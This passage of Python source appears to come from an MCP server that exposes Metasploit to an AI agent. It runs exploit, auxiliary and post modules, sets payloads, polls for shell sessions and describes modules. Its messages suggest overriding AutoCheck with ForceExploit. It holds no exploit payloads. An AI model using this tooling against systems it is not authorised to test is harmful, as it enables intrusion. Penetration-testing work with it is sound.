        if exec_result.get("error", False):
            error_msg = exec_result.get(
                "error_message",
                exec_result.get("error_string", "Unknown RPC error during execution"),
            )
            logger.error(f"Failed to start job for {full_module_path}: {error_msg}")
            # Check for common errors
            if "could not bind" in error_msg.lower():
                return {
                    "status": "error",
                    "message": f"Job start failed: Address/Port likely already in use. {error_msg}",
                    "module": full_module_path,
                }
            return {
                "status": "error",
                "message": f"Failed to start job: {error_msg}",
                "module": full_module_path,
            }

        job_id = exec_result.get("job_id")
        uuid = exec_result.get("uuid")

        if job_id is None:
            logger.warning(
                f"{module_type.capitalize()} job executed but no job_id returned: {exec_result}"
            )
            # Sometimes handlers don't return job_id but are running, check by UUID/name later maybe
            if module_type == "exploit" and "handler" in full_module_path:
                # Check jobs list for a match based on payload/lhost/lport
                await asyncio.sleep(1.0)
                jobs_list = await asyncio.to_thread(lambda: client.jobs.list)
                for jid, jinfo in jobs_list.items():
                    if (
                        isinstance(jinfo, dict)
                        and jinfo.get("name", "").endswith("Handler")
                        and jinfo.get("datastore", {}).get("LHOST") == module_options.get("LHOST")
                        and jinfo.get("datastore", {}).get("LPORT") == module_options.get("LPORT")
                        and jinfo.get("datastore", {}).get("PAYLOAD") == payload_name_for_log
                    ):
                        logger.info(f"Found probable handler job {jid} matching parameters.")
                        return {
                            "status": "success",
                            "message": f"Listener likely started as job {jid}",
                            "job_id": jid,
                            "uuid": uuid,
                            "module": full_module_path,
                        }

            return {
                "status": "unknown",
                "message": f"{module_type.capitalize()} executed, but no job ID returned.",
                "result": exec_result,
                "module": full_module_path,
            }

        # --- Exploit Specific: Poll for Session (skip for handlers) ---
        found_session_id = None
        is_handler_module = "handler" in full_module_path.lower()

        if module_type == "exploit" and uuid and not is_handler_module:
            start_time = asyncio.get_event_loop().time()
            uuid_str = str(uuid)
            logger.info(
                f"Exploit job {job_id} (UUID: {uuid}) started. Polling for session (timeout: {EXPLOIT_SESSION_POLL_TIMEOUT}s)..."
            )
            poll_count = 0
            missing_uuid_polls = 0
            while (asyncio.get_event_loop().time() - start_time) < EXPLOIT_SESSION_POLL_TIMEOUT:
                poll_count += 1
                elapsed = asyncio.get_event_loop().time() - start_time

                # Calculate progress (0-90% until session found)
                progress_pct = min(int((elapsed / EXPLOIT_SESSION_POLL_TIMEOUT) * 90), 90)

                # Log progress every few polls to avoid log spam
                if poll_count % 5 == 0:
                    logger.info(
                        f"Still polling for session (elapsed: {int(elapsed)}s, checks: {poll_count})"
                    )

                try:
                    job_status_getter = getattr(client.jobs, "info_by_uuid", None)
                    if callable(job_status_getter):
                        job_status = await asyncio.to_thread(lambda: job_status_getter(str(uuid)))
                        if isinstance(job_status, dict):
                            status_value = str(job_status.get("status", "")).lower()
                            if status_value in {"errored", "error", "failed"}:
                                job_error = (
                                    job_status.get("error")
                                    or job_status.get("error_message")
                                    or job_status.get("message")
                                    or "Unknown job error"
                                )
                                logger.error(
                                    "Exploit job %s (UUID: %s) reported error status %r: %s",
                                    job_id,
                                    uuid,
                                    status_value,
                                    job_error,
                                )
                                return {
                                    "status": "error",
                                    "message": f"Exploit job {job_id} failed: {job_error}",
                                    "job_id": job_id,
                                    "uuid": uuid,
                                    "job_error": str(job_error),
                                    "session_id": None,
                                    "module": full_module_path,
                                    "options": module_options,
                                    "payload_name": payload_name_for_log,
                                    "payload_options": payload_options_for_log,
                                }

                    sessions_list = await asyncio.to_thread(lambda: client.sessions.list)
                    for s_id, s_info in sessions_list.items():
                        # Ensure comparison is robust (uuid might be str or bytes, info dict keys too)
                        s_id_str = str(s_id)
                        if isinstance(s_info, dict) and str(s_info.get("exploit_uuid")) == uuid_str:
                            found_session_id = s_id  # Keep original type from list keys
                            logger.info(
                                f"Found matching session {found_session_id} for job {job_id} (UUID: {uuid}) after {int(elapsed)}s and {poll_count} checks"
                            )
                            break  # Exit inner loop

                    if found_session_id is not None:
                        break  # Exit outer loop

                    # Detect completed/failed exploit jobs quickly by observing module running stats.
                    # This avoids waiting the full timeout when AutoCheck aborts immediately.
                    running_stats = await asyncio.to_thread(
                        lambda: client.call("module.running_stats")
                    )
                    if isinstance(running_stats, dict):
                        results_list = running_stats.get("results", [])
                        running_list = running_stats.get("running", [])
                        waiting_list = running_stats.get("waiting", [])
                        uuid_present = (
                            uuid_str in running_list
                            or uuid_str in waiting_list
                            or uuid_str in results_list
                        )

                        if uuid_str in results_list:
                            missing_uuid_polls = 0
                            error_detail = await _get_module_error_from_events(client, uuid_str)
                            if error_detail:
                                logger.error(
                                    "Exploit job %s (UUID: %s) completed with module_error: %s",
                                    job_id,
                                    uuid,
                                    error_detail,
                                )
                                return {
                                    "status": "error",
                                    "message": f"Exploit job {job_id} failed: {error_detail}",
                                    "job_id": job_id,
                                    "uuid": uuid,
                                    "job_error": str(error_detail),
                                    "session_id": None,
                                    "module": full_module_path,
                                    "options": module_options,
                                    "payload_name": payload_name_for_log,
                                    "payload_options": payload_options_for_log,
                                    "exploit_error": str(error_detail),
                                }

                            logger.warning(
                                "Exploit job %s (UUID: %s) completed without session; allowing grace check.",
                                job_id,
                                uuid,
                            )
                            await asyncio.sleep(EXPLOIT_SESSION_POLL_INTERVAL * 2)
                            sessions_list = await asyncio.to_thread(lambda: client.sessions.list)
                            for s_id, s_info in sessions_list.items():
                                if (
                                    isinstance(s_info, dict)
                                    and str(s_info.get("exploit_uuid")) == uuid_str
                                ):
                                    found_session_id = s_id
                                    logger.info(
                                        "Found matching session %s for completed job %s (UUID: %s) during grace check.",
                                        found_session_id,
                                        job_id,
                                        uuid,
                                    )
                                    break
                            break

                        if not uuid_present:
                            missing_uuid_polls += 1
                            logger.debug(
                                "UUID %s missing from module.running_stats (poll=%s, elapsed=%.1fs); checking db.events for failure.",
                                uuid_str,
                                missing_uuid_polls,
                                elapsed,
                            )
                            error_detail = await _get_module_error_from_events(client, uuid_str)
                            if error_detail:
                                return {
                                    "status": "error",
                                    "message": f"Exploit job {job_id} failed: {error_detail}",
                                    "job_id": job_id,
                                    "uuid": uuid,
                                    "job_error": str(error_detail),
                                    "session_id": None,
                                    "module": full_module_path,
                                    "options": module_options,
                                    "payload_name": payload_name_for_log,
                                    "payload_options": payload_options_for_log,
                                    "exploit_error": str(error_detail),
                                }
                            if (
                                missing_uuid_polls >= UUID_MISSING_GRACE_POLLS
                                and elapsed >= UUID_MISSING_GRACE_SECONDS
                            ):
                                logger.warning(
                                    "UUID %s missing from module.running_stats for %s polls over %.1fs; treating job %s as no longer trackable.",
                                    uuid_str,
                                    missing_uuid_polls,
                                    elapsed,
                                    job_id,
                                )
                                break
                        else:
                            missing_uuid_polls = 0

                    # Optional: Check if job died prematurely
                    # job_info = await asyncio.to_thread(lambda: client.jobs.info(str(job_id)))
                    # if not job_info or job_info.get('status') != 'running':
                    #     logger.warning(f"Job {job_id} stopped or disappeared during session polling.")
                    #     break

                except MsfRpcError as poll_e:
                    logger.warning(f"Error during session polling: {poll_e}")
                except Exception as poll_e:
                    logger.error(f"Unexpected error during polling: {poll_e}", exc_info=True)
                    break

                await asyncio.sleep(EXPLOIT_SESSION_POLL_INTERVAL)

            if found_session_id is None:
                elapsed_total = asyncio.get_event_loop().time() - start_time
                if elapsed_total >= (EXPLOIT_SESSION_POLL_TIMEOUT - EXPLOIT_SESSION_POLL_INTERVAL):
                    logger.warning(
                        "Polling timeout (%ss) reached for job %s, no matching session found after %s checks.",
                        EXPLOIT_SESSION_POLL_TIMEOUT,
                        job_id,
                        poll_count,
                    )
                else:
                    logger.warning(
                        "Stopped polling early for job %s after %.1fs (%s checks), no matching session found.",
                        job_id,
                        elapsed_total,
                        poll_count,
                    )
        elif is_handler_module:
            logger.info(
                f"Handler job {job_id} started successfully. No session polling needed - handler will wait for connections."
            )

        # --- Auxiliary/Post Module: Poll for Completion and Retrieve Results ---
        module_result = None
        module_result_status = None
        if module_type in ("auxiliary", "post") and uuid:
            start_time = asyncio.get_event_loop().time()
            logger.info(
                f"{module_type.capitalize()} job {job_id} (UUID: {uuid}) started. Polling for completion (timeout: {MODULE_RESULT_POLL_TIMEOUT}s)..."
            )
            poll_count = 0
            uuid_str = str(uuid)

            while (asyncio.get_event_loop().time() - start_time) < MODULE_RESULT_POLL_TIMEOUT:
                poll_count += 1
                elapsed = asyncio.get_event_loop().time() - start_time

                # Log progress every few polls to avoid log spam
                if poll_count % 10 == 0:
                    logger.info(
                        f"Still polling for {module_type} completion (elapsed: {int(elapsed)}s, checks: {poll_count})"
                    )

                try:
                    # Check module.running_stats to see if UUID is in results
                    running_stats = await asyncio.to_thread(
                        lambda: client.call("module.running_stats")
                    )

                    if not isinstance(running_stats, dict):
                        logger.warning(
                            f"Unexpected type from module.running_stats: {type(running_stats)}"
                        )
                        await asyncio.sleep(MODULE_RESULT_POLL_INTERVAL)
                        continue

                    # Check if UUID is in the results array (module completed)
                    results_list = running_stats.get("results", [])
                    if uuid_str in results_list:
                        logger.info(
                            f"{module_type.capitalize()} job {job_id} (UUID: {uuid}) completed after {int(elapsed)}s. Retrieving results..."
                        )

                        # Retrieve the actual module results
                        result_response = await asyncio.to_thread(
                            lambda: client.call("module.results", [uuid_str])
                        )

                        if isinstance(result_response, dict):
                            module_result_status = result_response.get("status", "unknown")
                            module_result = result_response.get("result")
                            logger.info(
                                f"Retrieved {module_type} results with status: {module_result_status}"
                            )
                        else:
                            logger.warning(
                                f"Unexpected type from module.results: {type(result_response)}"
                            )
                            module_result = result_response

                        break  # Exit polling loop

                    # Check if UUID is still in running or waiting
                    running_list = running_stats.get("running", [])
                    waiting_list = running_stats.get("waiting", [])

                    if (
                        uuid_str not in running_list
                        and uuid_str not in waiting_list
                        and uuid_str not in results_list
                    ):
                        logger.warning(
                            f"UUID {uuid_str} not found in running_stats (running/waiting/results). Module may have failed or UUID changed."
                        )
                        break

                except MsfRpcError as poll_e:
                    logger.warning(f"Error during {module_type} result polling: {poll_e}")
                    await asyncio.sleep(MODULE_RESULT_POLL_INTERVAL)
                    continue
                except Exception as poll_e:
                    logger.error(
                        f"Unexpected error during {module_type} result polling: {poll_e}",
                        exc_info=True,
                    )
                    break

                await asyncio.sleep(MODULE_RESULT_POLL_INTERVAL)

            if (
                module_result is None
                and (asyncio.get_event_loop().time() - start_time) >= MODULE_RESULT_POLL_TIMEOUT
            ):
                logger.warning(
                    f"Polling timeout ({MODULE_RESULT_POLL_TIMEOUT}s) reached for {module_type} job {job_id}, results not retrieved after {poll_count} checks."
                )

        # --- Construct Final Success/Warning Message ---
        message = f"{module_type.capitalize()} module {full_module_path} started as job {job_id}."
        status = "success"
        if module_type == "exploit":
            if is_handler_module:
                # Handlers are always successful - they wait for connections
                message += " Handler is waiting for connections."
            elif found_session_id is not None:
                message += f" Session {found_session_id} created."
            else:
                message += " No session detected within timeout."
                if not bool(module_options.get("ForceExploit", False)):
                    message += " If AutoCheck blocked exploitation, retry with ForceExploit=true (or set force_exploit=True)."
                status = "warning"  # Indicate job started but session didn't appear

                # If there's a job ID and a payload LPORT set, kill the job
                if job_id and (payload_options or {}).get("LPORT"):
                    await asyncio.to_thread(lambda: client.jobs.stop(str(job_id)))
                    logger.info(f"Killed job {job_id} due to LPORT setting in payload options.")
        elif module_type in ("auxiliary", "post"):
            if module_result is not None:
                if module_result_status == "completed":
                    message += f" Module completed successfully."
                else:
                    message += f" Module completed with status: {module_result_status}."
            else:
                message += " Module execution started, but results not yet available (may still be running)."
                status = "warning"  # Indicate results not retrieved

        result_dict = {
            "status": status,
            "message": message,
            "job_id": job_id,
            "uuid": uuid,
            "session_id": found_session_id,  # None if not found/not applicable
            "module": full_module_path,
            "options": module_options,
            "payload_name": payload_name_for_log,  # Include payload info if exploit
            "payload_options": payload_options_for_log,
        }

        # Add module results for auxiliary/post modules
        if module_type in ("auxiliary", "post"):
            result_dict["module_result_status"] = module_result_status
            result_dict["module_result"] = module_result

        return result_dict

    except (MsfRpcError, ValueError) as e:  # Catch module prep errors too
        error_str = str(e).lower()
        logger.error(f"Error executing module {full_module_path} via RPC: {e}")
        if "missing required option" in error_str or "invalid option" in error_str:
            missing = getattr(module_obj, "missing_required", [])
            return {
                "status": "error",
                "message": f"Missing/invalid options for {full_module_path}: {e}",
                "missing_required": missing,
            }
        elif "invalid payload" in error_str:
            # Provide helpful error message with suggestions
            # Check if architecture mismatch is likely (e.g., x86 vs x64)
            arch_hint = ""
            if payload_name_for_log:
                if "/x86/" in payload_name_for_log:
                    arch_hint = " (Note: x86 is 32-bit. Try x64 for 64-bit targets.)"
                elif "/x64/" in payload_name_for_log:
                    arch_hint = " (Note: x64 is 64-bit. Try x86 for 32-bit targets.)"

            error_msg = f"Invalid payload specified: {payload_name_for_log or 'None'}{arch_hint}. "
            error_msg += f"To view ONLY compatible payloads for this exploit, use: list_payloads(compatible_with='{module_name}')."
            error_msg += f" Original error: {e}"
            return {"status": "error", "message": error_msg}
        return {"status": "error", "message": f"Error running {full_module_path}: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error executing module {full_module_path} via RPC")
        return {
            "status": "error",
            "message": f"Unexpected server error running {full_module_path}: {e}",
        }


async def _execute_module_console(
    module_type: str,
    module_name: str,  # Can be full path or base name
    module_options: Dict[str, Any],
    command: str,  # Typically 'exploit', 'run', or 'check'
    payload_spec: Optional[Union[str, Dict[str, Any]]] = None,
    timeout: int = LONG_CONSOLE_READ_TIMEOUT,
    inactivity_timeout: Optional[int] = None,
    exit_terms_regexes: Optional[List[re.Pattern]] = None,
) -> Dict[str, Any]:
    """Helper to execute a module synchronously via console."""
    # Guard against console command injection via option values/keys before they
    # are interpolated into `set <key> <value>` commands (CVE-2026-5463).
    _reject_unsafe_option_chars(module_options, context=module_type)
    if isinstance(payload_spec, dict):
        _reject_unsafe_option_chars(payload_spec.get("options", {}), context="payload")

    # Determine full path needed for 'use' command
    if "/" not in module_name:
        full_module_path = f"{module_type}/{module_name}"
    else:
        # Assume full path or relative path was given; ensure type prefix
        if not module_name.startswith(module_type + "/"):
            # e.g., got 'windows/x', type 'exploit' -> 'exploit/windows/x'
            # e.g., got 'exploit/windows/x', type 'exploit' -> 'exploit/windows/x' (no change)
            if not any(
                module_name.startswith(pfx + "/")
                for pfx in ["exploit", "payload", "post", "auxiliary", "encoder", "nop"]
            ):
                full_module_path = f"{module_type}/{module_name}"
            else:  # Already has a type prefix, use it as is
                full_module_path = module_name
        else:  # Starts with correct type prefix
            full_module_path = module_name

    logger.info(f"Executing {full_module_path} synchronously via console (command: {command})...")

    payload_name_for_log = None
    payload_options_for_log = None

    async with get_msf_console() as console:
        try:
            setup_commands = [f"use {full_module_path}"]

            # Add module options
            for key, value in module_options.items():
                val_str = str(value)
                if isinstance(value, str) and any(c in val_str for c in [" ", '"', "'", "\\"]):
                    val_str = shlex.quote(val_str)
                elif isinstance(value, bool):
                    val_str = str(value).lower()  # MSF console expects lowercase bools
                setup_commands.append(f"set {key} {val_str}")

            # Add payload and payload options (if applicable)
            if payload_spec:
                payload_name = None
                payload_options = {}
                if isinstance(payload_spec, str):
                    payload_name = payload_spec
                elif isinstance(payload_spec, dict) and "name" in payload_spec:
                    payload_name = payload_spec["name"]
                    payload_options = payload_spec.get("options", {})

                if payload_name:
                    # Normalize payload name - strip 'payload/' prefix if present
                    normalized_payload = payload_name
                    if payload_name.startswith("payload/"):
                        normalized_payload = payload_name[8:]
                        logger.debug(
                            f"Normalized payload name for console: '{payload_name}' -> '{normalized_payload}'"
                        )

                    payload_name_for_log = payload_name
                    payload_options_for_log = payload_options

                    # Fetch Payloads (cmd/) should work via console - they use command stagers
                    # No special handling needed here, just log it
                    if normalized_payload.startswith("cmd/"):
                        logger.info(
                            f"Using Fetch Payload via console: '{normalized_payload}' (command stager-based)"
                        )

                    # Use normalized name for setting payload
                    payload_name = normalized_payload

                    # Need base name for 'set PAYLOAD'
                    if "/" in payload_name:
                        parts = payload_name.split("/")
                        if parts[0] == "payload":
                            payload_base_name = "/".join(parts[1:])
                        else:
                            payload_base_name = payload_name  # Assume relative
                    else:
                        payload_base_name = payload_name  # Assume just name

                    setup_commands.append(f"set PAYLOAD {payload_base_name}")
                    for key, value in payload_options.items():
                        val_str = str(value)
                        if isinstance(value, str) and any(
                            c in val_str for c in [" ", '"', "'", "\\"]
                        ):
                            val_str = shlex.quote(val_str)
                        elif isinstance(value, bool):
                            val_str = str(value).lower()
                        setup_commands.append(f"set {key} {val_str}")

            # Execute setup commands
            logger.info(f"Executing {len(setup_commands)} setup commands for {full_module_path}")
            for i, cmd in enumerate(setup_commands, 1):
                logger.debug(f"Setup command {i}/{len(setup_commands)}: {cmd}")
                setup_output = await run_command_safely(
                    console, cmd, execution_timeout=DEFAULT_CONSOLE_READ_TIMEOUT
                )

                # Basic error check in setup output
                if any(
                    err in setup_output
                    for err in [
                        "[-] Error setting",
                        "Invalid option",
                        "Unknown module",
                        "Failed to load",
                    ]
                ):
                    error_msg = f"Error during setup command '{cmd}': {setup_output}"

                    # Check if this is a payload-related error
                    if "set PAYLOAD" in cmd and (
                        "Invalid option" in setup_output or "Error setting" in setup_output
                    ):
                        # Add architecture hint if we can detect the issue
                        arch_hint = ""
                        if "/x86/" in cmd:
                            arch_hint = " Note: x86 is 32-bit - try x64 for 64-bit targets."
                        elif "/x64/" in cmd:
                            arch_hint = " Note: x64 is 64-bit - try x86 for 32-bit targets."

                        # Extract base module name for error message
                        base_module_name = module_name
                        if "/" in module_name:
                            parts = module_name.split("/")
                            if parts[0] != "exploit":
                                base_module_name = module_name
                        error_msg += f"\n{arch_hint}" if arch_hint else ""
                        error_msg += f"\nTo view ONLY compatible payloads for this exploit, use: list_payloads(compatible_with='{base_module_name}')"

                    logger.error(error_msg)
                    return {"status": "error", "message": error_msg, "module": full_module_path}

                logger.debug(f"Setup command {i} completed successfully")
                await asyncio.sleep(0.1)  # Small delay between setup commands

            # Execute the final command (exploit, run, check)
            logger.info(
                f"Setup complete. Executing final command '{command}' for {full_module_path} "
                f"(timeout: {timeout}s)"
            )

            start_execution_time = asyncio.get_event_loop().time()
            module_output = await run_command_safely(
                console,
                command,
                execution_timeout=timeout,
                inactivity_timeout=inactivity_timeout,
                exit_terms_regexes=exit_terms_regexes,
            )
            execution_duration = asyncio.get_event_loop().time() - start_execution_time

            # Check if the command timed out
            timed_out = module_output.startswith("TIMEOUT_ERROR:")
            if timed_out:
                # Remove the TIMEOUT_ERROR: prefix for cleaner output
                module_output = module_output.replace("TIMEOUT_ERROR:", "").strip()
                logger.warning(
                    f"Module {full_module_path} timed out after {execution_duration:.1f}s"
                )
            else:
                logger.info(
                    f"Module execution completed in {execution_duration:.1f}s. "
                    f"Output length: {len(module_output)} characters"
                )

            logger.debug(
                f"Module output preview: {module_output[:200]}{'...' if len(module_output) > 200 else ''}"
            )

            # --- Parse Console Output ---
            session_id = None
            session_opened_line = ""
            # More robust session detection pattern (using global regex)
            module_output_bytes = module_output.encode("utf-8", errors="replace")

            # Check for module load failure early - this should take precedence
            failed_to_load_match = FAILED_TO_LOAD_MODULE_RE.search(module_output_bytes)
            if failed_to_load_match:
                # Extract module name from the error message if possible
                module_name_match = re.search(
                    rb"Failed to load module:\s*([^\s\n]+)", module_output_bytes, re.IGNORECASE
                )
                failed_module = (
                    module_name_match.group(1).decode("utf-8", errors="replace")
                    if module_name_match
                    else full_module_path
                )
                error_msg = f"Module '{failed_module}' failed to load. This typically means the module does not exist or failed to initialize."
                logger.error(f"Module load failure detected: {error_msg}")
                return {
                    "status": "error",
                    "message": error_msg,
                    "module_output": module_output,
                    "module": full_module_path,
                    "options": module_options,
                    "payload_name": payload_name_for_log,
                    "payload_options": payload_options_for_log,
                    "timed_out": timed_out,
                    "execution_duration": execution_duration,
                }

            session_match = SESSION_OPENED_RE.search(module_output_bytes)
            if session_match:
                # Extract session ID from the matched text
                session_id_match = re.search(rb"session\s+(\d+)", session_match.group(0))
                if session_id_match:
                    try:
                        session_id = int(session_id_match.group(1))
                        session_opened_line = session_match.group(0).decode(
                            "utf-8", errors="replace"
                        )  # The matched line segment
                        logger.info(f"Detected session {session_id} opened in console output.")
                    except (ValueError, IndexError, AttributeError):
                        logger.warning("Found session opened pattern, but failed to parse ID.")

            status = "success"
            message = f"{module_type.capitalize()} module {full_module_path} completed via console ({command})."

            # Handle timeout case
            if timed_out:
                if command in ["exploit", "run"] and module_type in ["exploit"]:
                    status = "warning"
                    message = f"{module_type.capitalize()} module {full_module_path} timed out after {timeout}s. "
                    if session_id is None:
                        message += "Session may have been created after timeout. Check list_active_sessions() to verify."
                    else:
                        message += f"Session {session_id} was detected in partial output."
                else:
                    status = "error"
                    message = f"{module_type.capitalize()} module {full_module_path} timed out after {timeout}s."
            elif (
                command in ["exploit", "run"]
                and module_type in ["exploit"]
                and session_id is None
                and any(
                    term in module_output.lower() for term in ["session opened", "sending stage"]
                )
            ):
                message += " Session may have opened but ID detection failed or session closed quickly. Check list_active_sessions() to verify."
                status = "warning"
            elif (
                command in ["exploit", "run"]
                and module_type in ["exploit"]
                and session_id is not None
            ):
                message += f" Session {session_id} detected."
            elif (
                command in ["exploit", "run"] and module_type in ["exploit"] and session_id is None
            ):
                # No session detected and no hints of session activity - this is not truly "success" for an exploit
                status = "no_session"
                message = (
                    f"{module_type.capitalize()} module {full_module_path} completed but no session was created. "
                    "This may indicate: payload failed to connect back (check LHOST/LPORT and firewall), "
                    "target is not vulnerable, or exploit requires manual interaction. Check module_output for details."
                )

            # Check for common failure indicators (but not if we timed out)
            # Note: "exploit completed, but no session was created" is now handled by "no_session" status above
            failure_indicators = [
                "exploit failed",
                "run failed",
                "check failed",
                "module check failed",
            ]
            if not timed_out and any(fail in module_output.lower() for fail in failure_indicators):
                status = (
                    "error" if status not in ("warning", "no_session") else status
                )  # Don't override warning/no_session with error
                if status == "error":  # Only update message if we're setting error status
                    message = f"{module_type.capitalize()} module {full_module_path} execution via console appears to have failed. Check output."
                logger.error(f"Failure detected in console output for {full_module_path}.")

                # Check if the failure might be payload-related
                if payload_name_for_log and any(
                    term in module_output.lower() for term in ["payload", "incompatible", "invalid"]
                ):
                    # Extract base module name for error message
                    base_module_name = module_name
                    if "/" in module_name:
                        parts = module_name.split("/")
                        if parts[0] != "exploit":
                            base_module_name = module_name
                    message += f"\n\nThe failure may be payload-related. To view compatible payloads for this exploit, use: list_payloads(compatible_with='{base_module_name}')"

            return {
                "status": status,
                "message": message,
                "module_output": module_output,
                "session_id_detected": session_id,
                "session_opened_line": session_opened_line,
                "module": full_module_path,
                "options": module_options,
                "payload_name": payload_name_for_log,
                "payload_options": payload_options_for_log,
                "timed_out": timed_out,
                "execution_duration": execution_duration,
            }

        except (
            RuntimeError,
            MsfRpcError,
            ValueError,
        ) as e:  # Catch errors from run_command_safely or setup
            logger.error(f"Error during console execution of {full_module_path}: {e}")
            return {
                "status": "error",
                "message": f"Error executing {full_module_path} via console: {e}",
            }
        except Exception as e:
            logger.exception(f"Unexpected error during console execution of {full_module_path}")
            return {
                "status": "error",
                "message": f"Unexpected server error running {full_module_path} via console: {e}",
            }


# --- MCP Tool Definitions ---


@annotated_tool
async def describe_module(module: str, module_type: str = "exploit") -> Dict[str, Any]:
    """
    Get detailed information about a Metasploit module BEFORE using it.

    Call this tool to understand a module's options, requirements, and behavior
    before attempting to run it. This helps avoid option errors and ensures
    you use the correct parameters.

    RECOMMENDED WORKFLOW:
    1. Call describe_module() to understand available options and requirements
    2. Call get_module_documentation() for extended usage examples and scenarios
    3. Call run_exploit/run_auxiliary_module/run_post_module with correct options

    Args:
        module: Module path (e.g., 'windows/smb/ms17_010_eternalblue' or
                    'exploit/windows/smb/ms17_010_eternalblue')
        module_type: Type of module - 'exploit', 'auxiliary', 'post', or 'payload'
                    (default: 'exploit')

    Returns:
        Dict containing:
        - name: Human-readable module name
        - full_path: Full module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue')
        - description: What the module does
        - authors: Who wrote the module
        - references: CVEs, URLs, EDB IDs related to the vulnerability
        - options: All configurable options with:
            - type: Option type (string, integer, address, port, path, bool, enum)
            - required: Whether the option is required
            - default: Default value if any
            - description: What the option does
        - notes: Module metadata including:
            - stability: How stable the module is (CRASH_SAFE, CRASH_SERVICE_RESTARTS, etc.)
            - reliability: How reliable (REPEATABLE_SESSION, FIRST_ATTEMPT_FAIL, etc.)
            - side_effects: What artifacts it leaves (ARTIFACTS_ON_DISK, IOC_IN_LOGS, etc.)
        - targets: Available targets (for exploits)
        - platform: Supported platforms
        - arch: Supported architectures
        - rank: Module reliability ranking
        - privileged: Whether it requires privileged access
        - disclosure_date: When the vulnerability was disclosed
    """
    logger.info(f"describe_module called with module='{module}', module_type='{module_type}'")

    # Normalize module name - strip type prefix if provided to avoid double-prefix issues
    # e.g., if called with module_name="exploit/unix/ftp/foo" and module_type="exploit",
    # we should use "unix/ftp/foo" as base_module_name, not "exploit/unix/ftp/foo"
    base_module_name = module
    if "/" in module:
        parts = module.split("/")
        if parts[0] in ("exploit", "payload", "post", "auxiliary", "encoder", "nop"):
            # User provided full path, extract base name and potentially correct type
            if parts[0] != module_type:
                logger.debug(
                    f"Module type from path '{parts[0]}' differs from specified type '{module_type}', using path type"
                )
                module_type = parts[0]
            base_module_name = "/".join(parts[1:])
            logger.debug(
                f"Normalized module path: stripped '{parts[0]}/' prefix -> base_module_name='{base_module_name}'"
            )

    full_module_path = f"{module_type}/{base_module_name}"
    logger.info(f"describe_module: resolved to full_module_path='{full_module_path}'")

    try:
        client = get_msf_client()

        # Get module info via RPC
        logger.debug(f"Calling module.info RPC with args: ['{module_type}', '{base_module_name}']")
        module_info = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.call("module.info", [module_type, base_module_name])),
            timeout=RPC_CALL_TIMEOUT,
        )

        # Check for error response
        if isinstance(module_info, bool) and not module_info:
            # Module not found - try to find similar modules
            suggestions = await _find_similar_modules(module_type, base_module_name)
            suggestion_text = ""
            if suggestions:
                suggestion_text = "Did you mean one of these?\n  - " + "\n  - ".join(suggestions)
            return {
                "status": "not_found",
                "message": f"Module '{full_module_path}' not found in Metasploit.",
                "suggestions": suggestions,
                "suggestion_text": suggestion_text,
            }

        if isinstance(module_info, dict) and module_info.get("error"):
            error_message = module_info.get("error_message", "Unknown error")
            suggestions = await _find_similar_modules(module_type, base_module_name)
            return {
                "status": "error",
                "message": f"Error retrieving module info: {error_message}",
                "suggestions": suggestions,
            }

        # Get module options via direct RPC call (returns dict with full option details)
        # Note: pymetasploit3's module_obj.options returns only a list of option names,
        # not the full dict, so we use the RPC call directly.
        try:
            options_dict = await asyncio.wait_for(
                asyncio.to_thread(
                    lambda: client.call("module.options", [module_type, base_module_name])
                ),
                timeout=RPC_CALL_TIMEOUT,
            )
            logger.debug(
                f"Retrieved {len(options_dict) if isinstance(options_dict, dict) else 0} options via RPC"
            )
        except Exception as e:
            logger.warning(f"Could not get module options via RPC: {e}")
            options_dict = {}

        # Parse options into structured format
        structured_options = {}
        if not isinstance(options_dict, dict):
            logger.warning(
                f"Unexpected options type from RPC: {type(options_dict)}, defaulting to empty dict"
            )
            options_dict = {}

        for opt_name, opt_info in options_dict.items():
            if isinstance(opt_info, dict):
                structured_options[opt_name] = {
                    "type": opt_info.get("type", "string"),
                    "required": opt_info.get("required", False),
                    "default": opt_info.get("default"),
                    "description": opt_info.get("desc", ""),
                    "enums": opt_info.get("enums", []) if opt_info.get("type") == "enum" else None,
                }
                # Remove None values for cleaner output
                structured_options[opt_name] = {
                    k: v for k, v in structured_options[opt_name].items() if v is not None
                }

        # Parse notes if available (stability, reliability, side_effects)
        notes = {}
        raw_notes = module_info.get("notes", {})
        if isinstance(raw_notes, dict):
            if "Stability" in raw_notes:
                notes["stability"] = (
                    raw_notes["Stability"]
                    if isinstance(raw_notes["Stability"], list)
                    else [raw_notes["Stability"]]
                )
            if "Reliability" in raw_notes:
                notes["reliability"] = (
                    raw_notes["Reliability"]
                    if isinstance(raw_notes["Reliability"], list)
                    else [raw_notes["Reliability"]]
                )
            if "SideEffects" in raw_notes:
                notes["side_effects"] = (
                    raw_notes["SideEffects"]
                    if isinstance(raw_notes["SideEffects"], list)
                    else [raw_notes["SideEffects"]]
                )

        # Parse references
        references = []
        raw_refs = module_info.get("references", [])
        if isinstance(raw_refs, list):
            for ref in raw_refs:
                if isinstance(ref, list) and len(ref) >= 2:
                    references.append({"type": ref[0], "value": ref[1]})
                elif isinstance(ref, dict):
                    references.append(ref)

        # Parse targets (for exploits)
        targets = []
        raw_targets = module_info.get("targets", [])
        if isinstance(raw_targets, list):
            for idx, target in enumerate(raw_targets):
                if isinstance(target, list) and len(target) >= 1:
                    targets.append({"id": idx, "name": target[0]})
                elif isinstance(target, str):
                    targets.append({"id": idx, "name": target})

        # Build response
        result = {
            "status": "success",
            "name": module_info.get("name", base_module_name),
            "full_path": full_module_path,
            "description": module_info.get("description", ""),
            "authors": module_info.get("authors", []),
            "references": references,
            "options": structured_options,
            "notes": notes if notes else None,
            "targets": targets if targets else None,
            "platform": module_info.get("platform", []),
            "arch": module_info.get("arch", []),
            "rank": module_info.get("rank"),
            "privileged": module_info.get("privileged", False),
            "disclosure_date": module_info.get("disclosure_date"),
            "default_target": module_info.get("default_target"),
        }

        # Remove None values for cleaner output
        result = {k: v for k, v in result.items() if v is not None}

        logger.info(
            f"Successfully retrieved info for {full_module_path}: {len(structured_options)} options"
        )
        return result

    except InvalidModuleError as e:
        # Clean error for module not found
        return {"status": "not_found", "message": str(e), "suggestions": []}
    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) retrieving module info. Server may be slow."
        logger.error(error_msg)
        return {"status": "error", "message": error_msg}
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error in describe_module: {e}")
